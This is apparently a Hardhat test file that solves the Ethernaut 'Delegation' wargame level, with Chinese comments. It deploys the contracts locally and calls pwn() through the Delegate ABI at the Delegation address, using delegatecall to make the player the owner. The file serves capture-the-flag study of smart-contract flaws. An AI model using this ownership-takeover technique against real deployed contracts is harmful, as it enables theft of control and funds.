const { expect } = require("chai");
const { ethers } = require("hardhat");
var tools = require("./tools");

describe("06Delegate", function () {
  let player, levelOwner, levelContract;
  it("setup", async function () {
    [player, levelOwner] = await ethers.getSigners();
    delegateContract = await tools.deployContract(
      "Delegate",
      levelOwner,
      levelOwner.address
    );
    levelContract = await tools.deployContract(
      "Delegation",
      levelOwner,
      delegateContract.address
    );
    //检查原始的owner
    expect(await levelContract.owner()).to.not.equal(player.address);
  });

  it("attacks", async function () {
    //代理，不能直接调用await levelContract.pwd(),会找到方法，abi没有
    const contract = await ethers.getContractAt(
      "Delegate",
      levelContract.address,
      player
    );
    await contract.pwn();
  });

  it("check", async function () {
    //检查通过条件
    expect(await levelContract.owner()).to.equal(player.address);
  });
});
